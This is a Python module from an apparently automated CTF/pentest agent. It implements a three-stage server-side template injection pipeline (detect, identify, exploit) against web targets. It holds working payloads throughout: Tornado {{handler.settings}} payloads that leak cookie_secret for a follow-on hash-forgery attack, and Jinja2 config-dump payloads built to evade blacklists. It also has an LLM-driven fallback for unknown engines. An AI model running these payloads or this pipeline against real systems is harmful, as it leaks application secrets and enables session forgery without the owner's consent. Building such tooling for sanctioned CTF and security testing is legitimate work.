"""SSTI strategy executor extracted from ctf_dispatcher.py.

P5 / fifteenth cut: the SSTI strategy cluster (6 methods, ~586 lines) is
physically moved out of CTFTaskDispatcher into a behaviour-preserving
mixin — the conservative-mode exploitation gate plus the render-parameter
SSTI strategy, its Tornado alias, and the Phase 7 three-stage pipeline
(probe -> identify -> exploit).

Method bodies are identical. All ``self.*`` access resolves at runtime via
the MRO of the dispatcher that mixes this in: render-surface helpers
(``_collect_render_surface_urls`` / ``_inject_render_payload`` /
``_strategy_surface_signature`` / ``_was_strategy_surface_exhausted`` /
``_mark_strategy_surface_exhausted`` / ``_response_fingerprint`` /
``_extract_cookie_secret_candidate``) live in RenderSurfaceMixin,
``_extract_flag`` in FlagParserMixin, ``_observe_flag`` in
FlagObserverMixin, ``_run_llm_driven_exploration`` in LLMExecutorMixin, and
``_run_hash_reconstruction_attack_strategy`` / ``_scan_and_store`` /
``_record_uniform_failure_surface`` / ``_strategy_context`` stay on the
dispatcher — all reachable via ``self`` unchanged. ``_ssti_exploitation_gated_by_mode``
is also called by the hash-guarded-read strategy (which stays on the
dispatcher); MRO resolves it there too. The only module-level symbols are
``_ChainOutcome`` and ``_base_target`` (acyclic) plus stdlib ``re`` /
``urllib.parse``. Zero constants to sink, near-zero risk.
"""

from __future__ import annotations

import re
from typing import Any
from urllib.parse import urljoin, urlparse

from .chains.base import _ChainOutcome
from .dispatcher_helpers import _base_target


class SSTIExecutorMixin:
    """Render-parameter SSTI strategy and the Phase 7 probe/identify/exploit pipeline."""

    def _ssti_exploitation_gated_by_mode(self) -> bool:
        """Whether to withhold specific SSTI exploitation payloads right now.

        Conservative (pentest) mode blocks engine-specific / cookie_secret
        exploitation payloads until a ``{{7*7}}`` probe has confirmed the vuln
        class (recorded as an ``ssti_probe_hit`` observation) — info-gathering
        before exploitation. Aggressive (CTF default) never gates: it takes the
        shortest chain to the flag and fires exploit payloads directly.
        """
        if self.exploitation_mode != "conservative":
            return False
        if self.state is None:
            return False
        return not any(
            str(getattr(obs, "kind", "") or "") == "ssti_probe_hit"
            for obs in self.state.observations
        )

    async def _run_render_parameter_ssti_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
        *,
        strategy_kind: str = "ssti_via_render_parameter",
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features / state observations
        Output: _ChainOutcome；副作用：写入 render/ssti 观察与 cookie_secret
        Success: 发现 render/msg 参数 SSTI 并泄露 cookie_secret，随后进入 hash 重构
        Failure: render 参数探针全部无效；保留 progress 供上层继续决策
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        progress = False
        reasons: list[str] = []
        baseline_tokens: set[str] = set()

        candidate_urls = self._collect_render_surface_urls(base, page_features)
        if not candidate_urls:
            candidate_urls = [urljoin(base + "/", "error?msg=Error")]
        surface_signature = self._strategy_surface_signature(
            strategy_kind,
            candidate_urls,
        )
        if self._was_strategy_surface_exhausted(
            strategy_kind,
            surface_signature,
        ):
            return _ChainOutcome(
                progress=False,
                reason=f"{strategy_kind} render parameter surface already exhausted",
            )

        try:
            baseline_resp = await self.runtime.proxy_action(
                "get",
                url=urljoin(base + "/", "error?msg=Error"),
                timeout=10,
            )
            if isinstance(baseline_resp, dict) and not baseline_resp.get("error"):
                baseline_body = str(baseline_resp.get("body") or "")
                baseline_plain = re.sub(r"<[^>]+>", " ", baseline_body)
                baseline_tokens = set(
                    re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{3,}", baseline_plain)
                )
        except Exception:
            pass

        payloads = [
            "{{7*7}}",
            "{{handler.settings}}",
            '{{handler.settings["cookie_secret"]}}',
            '{{handler.settings.get("cookie_secret","")}}',
        ]
        cookie_secret: str | None = None
        response_fingerprints: list[str] = []

        for candidate in candidate_urls:
            for payload in payloads:
                # Conservative mode: the {{7*7}} probe is always allowed, but
                # specific exploitation payloads ({{handler.settings...}}) are
                # withheld until the probe confirms SSTI.
                if payload != "{{7*7}}" and self._ssti_exploitation_gated_by_mode():
                    continue
                probe_url = self._inject_render_payload(candidate, payload)
                try:
                    resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                except Exception:
                    continue
                if not isinstance(resp, dict) or resp.get("error"):
                    continue

                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                final_url = str(resp.get("final_url") or probe_url)
                redirect_history = list(resp.get("redirect_history") or [])
                if not body:
                    continue
                progress = True
                reasons.append(f"render_ssti {urlparse(final_url).path}: status={status}")
                if self.state is not None:
                    self.state.add_observation(
                        "render_ssti_response",
                        body[:500],
                        source=strategy_kind,
                        metadata={
                            "strategy_kind": strategy_kind,
                            "payload": payload,
                            "url": probe_url,
                            "final_url": final_url,
                            "redirect_history": redirect_history,
                            "status_code": status,
                        },
                    )

                flag = self._extract_flag(body)
                if flag:
                    verification = await self._observe_flag(
                        flag,
                        base,
                        evidence_source="response_body",
                        rationale=f"render param SSTI via {probe_url}",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"render param SSTI flag via {urlparse(final_url).path}",
                        )

                if payload == "{{7*7}}" and "49" in body:
                    reasons.append("render param appears SSTI-capable")
                    # Conservative mode records the probe hit so the gate above
                    # (and the identify strategy) now permits exploitation.
                    if self.exploitation_mode == "conservative" and self.state is not None:
                        self.state.add_observation(
                            "ssti_probe_hit",
                            body[:200],
                            source=strategy_kind,
                            metadata={
                                "strategy_kind": strategy_kind,
                                "payload": payload,
                                "url": probe_url,
                            },
                        )

                await self._scan_and_store(body, base, evidence_source="response_body")
                response_fingerprints.append(self._response_fingerprint(body, status))
                cookie_secret = self._extract_cookie_secret_candidate(
                    body,
                    baseline_tokens=baseline_tokens,
                )
                if cookie_secret:
                    break
            if cookie_secret:
                break

        if cookie_secret and self.state is not None:
            self.state.add_observation(
                "cookie_secret_leaked",
                cookie_secret,
                source=strategy_kind,
                metadata={"method": "render_param_ssti", "strategy_kind": strategy_kind},
            )
            outcome = await self._run_hash_reconstruction_attack_strategy(
                base,
                cookie_secret,
            )
            if outcome.flag:
                return outcome
            reasons.append(
                f"render param leaked cookie_secret ({cookie_secret[:6]}...), hash computed"
            )
        elif progress and len(set(response_fingerprints)) <= 1:
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    response_fingerprints[0] if response_fingerprints else "uniform_failure",
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "signature": surface_signature,
                        "candidate_urls": list(candidate_urls),
                        "response_fingerprints": list(response_fingerprints),
                        "reason": "render parameter surface returned uniform blocked responses",
                    },
                )
            self._mark_strategy_surface_exhausted(
                strategy_kind,
                surface_signature,
                candidate_urls=candidate_urls,
                response_fingerprints=response_fingerprints,
            )
            reasons.append("render parameter surface returned uniform blocked responses")

        return _ChainOutcome(progress=progress, reason="; ".join(dict.fromkeys(reasons))[:300])

    async def _run_tornado_ssti_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        return await self._run_render_parameter_ssti_strategy(
            target,
            page_features,
            strategy_kind="tornado_ssti",
        )

    # ------------------------------------------------------------------
    # Phase 7 §5: three-stage SSTI pipeline (Detect → Identify → Exploit)
    # ------------------------------------------------------------------

    async def _run_ssti_probe_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Phase 7 SSTI Stage 1 — Detect.

        Sends four generic probe payloads ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>)
        to the render surface.  Records a ``ssti_probe_hit`` observation when
        "49" appears in any response, and ``render_ssti_response`` for every
        non-empty response (enabling the identify stage precondition).
        If all responses are uniform failures, marks the surface exhausted.
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        candidate_urls = self._collect_render_surface_urls(base, page_features)
        if not candidate_urls:
            candidate_urls = [urljoin(base + "/", "error?msg=Error")]

        surface_signature = self._strategy_surface_signature("ssti_probe", candidate_urls)
        if self._was_strategy_surface_exhausted("ssti_probe", surface_signature):
            return _ChainOutcome(
                progress=False,
                reason="ssti_probe render surface already exhausted",
            )

        probe_payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]
        probe_hit = False
        any_response = False
        response_fingerprints: list[str] = []

        for candidate in candidate_urls:
            for payload in probe_payloads:
                probe_url = self._inject_render_payload(candidate, payload)
                try:
                    resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                except Exception:
                    continue
                if not isinstance(resp, dict) or resp.get("error"):
                    continue
                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                if not body:
                    continue
                any_response = True
                if self.state is not None:
                    self.state.add_observation(
                        "render_ssti_response",
                        body[:500],
                        source="ssti_probe",
                        metadata={
                            "strategy_kind": "ssti_probe",
                            "payload": payload,
                            "url": probe_url,
                            "status_code": status,
                        },
                    )
                response_fingerprints.append(self._response_fingerprint(body, status))
                if "49" in body:
                    probe_hit = True
                    if self.state is not None:
                        self.state.add_observation(
                            "ssti_probe_hit",
                            payload,
                            source="ssti_probe",
                            metadata={"url": probe_url, "response_snippet": body[:200]},
                        )

        if any_response and not probe_hit and len(set(response_fingerprints)) <= 1:
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    response_fingerprints[0] if response_fingerprints else "uniform_failure",
                    source="ssti_probe",
                    metadata={
                        "strategy_kind": "ssti_probe",
                        "signature": surface_signature,
                        "candidate_urls": list(candidate_urls),
                        "response_fingerprints": list(response_fingerprints),
                        "reason": "ssti probe: render surface returned uniform responses with no '49'",
                    },
                )
            self._mark_strategy_surface_exhausted(
                "ssti_probe",
                surface_signature,
                candidate_urls=candidate_urls,
                response_fingerprints=response_fingerprints,
            )

        reason = (
            "ssti probe hit: '49' found in render response"
            if probe_hit
            else (
                "ssti probe: render surface accessible, no '49' detected"
                if any_response
                else "ssti probe: no render surface response"
            )
        )
        return _ChainOutcome(progress=any_response, reason=reason)

    async def _run_ssti_identify_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Phase 7 SSTI Stage 2 — Identify.

        Runs once per challenge (guarded by ``ssti_identify_attempted``).
        Sends engine-specific probes to the render surface and records
        ``ssti_engine_identified`` with the engine name.  For Tornado,
        also extracts the cookie_secret from the ``{{handler.settings}}``
        response if present, saving the exploit stage an extra request.
        """
        # Conservative mode: do not attempt engine-specific identification (which
        # fires {{handler.settings}} and leaks cookie_secret) until a probe has
        # confirmed SSTI. This skips identify entirely when the probe has no hit.
        if self._ssti_exploitation_gated_by_mode():
            return _ChainOutcome(
                progress=False,
                reason="conservative mode: SSTI not confirmed by probe; identify skipped",
            )
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        candidate_urls = self._collect_render_surface_urls(base, page_features)
        if not candidate_urls:
            candidate_urls = [urljoin(base + "/", "error?msg=Error")]

        engine: str | None = None

        for candidate in candidate_urls:
            # --- Tornado probe: {{handler.settings}} -----------------------
            tornado_url = self._inject_render_payload(candidate, "{{handler.settings}}")
            try:
                resp = await self.runtime.proxy_action("get", url=tornado_url, timeout=10)
            except Exception:
                resp = None
            if isinstance(resp, dict) and not resp.get("error"):
                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                if body and "cookie_secret" in body:
                    engine = "tornado"
                    if self.state is not None:
                        self.state.add_observation(
                            "render_ssti_response",
                            body[:500],
                            source="ssti_identify",
                            metadata={
                                "strategy_kind": "ssti_identify",
                                "payload": "{{handler.settings}}",
                                "url": tornado_url,
                                "status_code": status,
                            },
                        )
                        self.state.add_observation(
                            "ssti_engine_identified",
                            "tornado",
                            source="ssti_identify",
                            metadata={"url": tornado_url, "evidence": body[:200]},
                        )
                    # Extract cookie_secret immediately to skip an extra request
                    cookie_secret = self._extract_cookie_secret_candidate(body)
                    if cookie_secret and self.state is not None:
                        self.state.add_observation(
                            "cookie_secret_leaked",
                            cookie_secret,
                            source="ssti_identify",
                            metadata={
                                "method": "handler_settings_probe",
                                "strategy_kind": "ssti_identify",
                            },
                        )
                    break
            # --- Jinja2 probe: {{7*'7'}} fingerprint / {{config}} dump ------
            # {{7*'7'}} -> "7777777" is a paren-free, non-shadowed Jinja2
            # fingerprint that survives challenges which blacklist ``config`` /
            # ``self`` (e.g. shrine sets them to None), where {{config}} yields
            # nothing useful.
            for jinja_payload in ("{{7*'7'}}", "{{config}}", "{{self._TemplateReference__context.config}}"):
                jinja_url = self._inject_render_payload(candidate, jinja_payload)
                try:
                    resp = await self.runtime.proxy_action("get", url=jinja_url, timeout=10)
                except Exception:
                    resp = None
                if not isinstance(resp, dict) or resp.get("error"):
                    continue
                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                if not body:
                    continue
                lowered = body.lower()
                if "7777777" in body or any(
                    marker in lowered for marker in ("secret_key", "jinja", "config", "flask")
                ):
                    engine = "jinja2"
                    if self.state is not None:
                        self.state.add_observation(
                            "render_ssti_response",
                            body[:500],
                            source="ssti_identify",
                            metadata={
                                "strategy_kind": "ssti_identify",
                                "payload": jinja_payload,
                                "url": jinja_url,
                                "status_code": status,
                            },
                        )
                        self.state.add_observation(
                            "ssti_engine_identified",
                            "jinja2",
                            source="ssti_identify",
                            metadata={"url": jinja_url, "evidence": body[:200]},
                        )
                    break
            if engine == "jinja2":
                break

        # Mark as attempted so this stage does not re-run in subsequent iterations
        if self.state is not None:
            self.state.add_observation(
                "ssti_identify_attempted",
                engine or "no_match",
                source="ssti_identify",
                metadata={"engine": engine},
            )

        return _ChainOutcome(
            progress=engine is not None,
            reason=f"ssti identify: engine={engine}" if engine else "ssti identify: engine not determined",
        )

    async def _run_ssti_exploit_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Phase 7 SSTI Stage 3 — Exploit.

        Reads the identified engine from ``ssti_engine_identified`` observations.
        For Tornado: uses ``cookie_secret`` already present in state (from identify
        stage) to skip directly to hash reconstruction, or falls back to sending
        explicit ``{{handler.settings[\"cookie_secret\"]}}`` payloads.
        For Jinja2: attempts ``{{config}}`` config-dump exploit.
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)

        # Conservative (pentest) mode: confirm the SSTI vuln class with a {{7*7}}
        # probe before firing exploitation payloads (info-gathering first). Run
        # the probe inline if it hasn't happened; if it still doesn't confirm,
        # withhold exploitation. Aggressive (CTF) mode skips this and exploits
        # directly — the shortest chain to the flag.
        if self.exploitation_mode == "conservative":
            if self._ssti_exploitation_gated_by_mode():
                await self._run_ssti_probe_strategy(target, page_features)
            if self._ssti_exploitation_gated_by_mode():
                return _ChainOutcome(
                    progress=False,
                    reason="conservative mode: SSTI not confirmed by probe; exploit withheld",
                )

        # Retrieve identified engine and any already-extracted cookie_secret
        engine: str | None = None
        cookie_secret: str | None = None
        if self.state is not None:
            for obs in reversed(list(self.state.observations)):
                if obs.kind == "ssti_engine_identified" and engine is None:
                    engine = str(obs.value or "")
                if obs.kind == "cookie_secret_leaked" and cookie_secret is None:
                    cookie_secret = str(obs.value or "")

        if engine == "tornado":
            # Fast path: cookie_secret already extracted in identify stage
            if cookie_secret:
                outcome = await self._run_hash_reconstruction_attack_strategy(
                    base, cookie_secret
                )
                if outcome.flag:
                    return outcome
            # Slow path: send explicit exploit payloads
            exploit_payloads = [
                '{{handler.settings["cookie_secret"]}}',
                '{{handler.settings.get("cookie_secret","")}}',
            ]
            candidate_urls = self._collect_render_surface_urls(base, page_features)
            if not candidate_urls:
                candidate_urls = [urljoin(base + "/", "error?msg=Error")]
            for candidate in candidate_urls:
                for payload in exploit_payloads:
                    probe_url = self._inject_render_payload(candidate, payload)
                    try:
                        resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    if not body:
                        continue
                    if self.state is not None:
                        self.state.add_observation(
                            "render_ssti_response",
                            body[:500],
                            source="ssti_exploit",
                            metadata={
                                "strategy_kind": "ssti_exploit",
                                "payload": payload,
                                "url": probe_url,
                            },
                        )
                    flag = self._extract_flag(body)
                    if flag:
                        verification = await self._observe_flag(
                            flag, base, evidence_source="response_body",
                            rationale=f"Tornado SSTI exploit via {probe_url}",
                        )
                        if verification.decision in {"verified", "runtime"}:
                            return _ChainOutcome(
                                progress=True, flag=verification.flag,
                                reason=f"Tornado SSTI flag via {probe_url}",
                            )
                    found_secret = self._extract_cookie_secret_candidate(body)
                    if found_secret:
                        if self.state is not None:
                            self.state.add_observation(
                                "cookie_secret_leaked", found_secret,
                                source="ssti_exploit",
                                metadata={"method": "explicit_payload", "strategy_kind": "ssti_exploit"},
                            )
                        outcome = await self._run_hash_reconstruction_attack_strategy(
                            base, found_secret
                        )
                        if outcome.flag:
                            return outcome
            return _ChainOutcome(
                progress=False, reason="ssti_exploit(tornado): no cookie_secret or flag found"
            )

        elif engine == "jinja2":
            # Jinja2 path: try config dump
            candidate_urls = self._collect_render_surface_urls(base, page_features)
            if not candidate_urls:
                candidate_urls = [urljoin(base + "/", "error?msg=Error")]
            # The globals-based payloads reach ``current_app.config`` through a
            # builtin global (url_for / get_flashed_messages) rather than the
            # bare ``config`` name, so they survive challenges that shadow
            # ``config``/``self`` (shrine sets them to None). All are paren-free
            # to also survive ``(`` / ``)`` stripping.
            for candidate in candidate_urls:
                for jinja_payload in [
                    "{{config}}",
                    "{{self._TemplateReference__context.config}}",
                    "{{url_for.__globals__['current_app'].config}}",
                    "{{get_flashed_messages.__globals__['current_app'].config}}",
                    "{{url_for.__globals__['current_app'].config['FLAG']}}",
                ]:
                    probe_url = self._inject_render_payload(candidate, jinja_payload)
                    try:
                        resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    if not body:
                        continue
                    flag = self._extract_flag(body)
                    if flag:
                        verification = await self._observe_flag(
                            flag, base, evidence_source="response_body",
                            rationale=f"Jinja2 SSTI config dump via {probe_url}",
                        )
                        if verification.decision in {"verified", "runtime"}:
                            return _ChainOutcome(
                                progress=True, flag=verification.flag,
                                reason="Jinja2 SSTI config dump",
                            )
            return _ChainOutcome(
                progress=False, reason="ssti_exploit(jinja2): no flag found in config dump"
            )

        # Unknown engine — LLM-driven fallback if available
        llm_instance = getattr(self, "llm", None)
        if llm_instance is not None:
            ctx = self._strategy_context(target=target, page_features=page_features, hint="")
            return await self._run_llm_driven_exploration(ctx)
        return _ChainOutcome(
            progress=False,
            reason=f"ssti_exploit: engine='{engine}' not handled, no LLM available",
        )
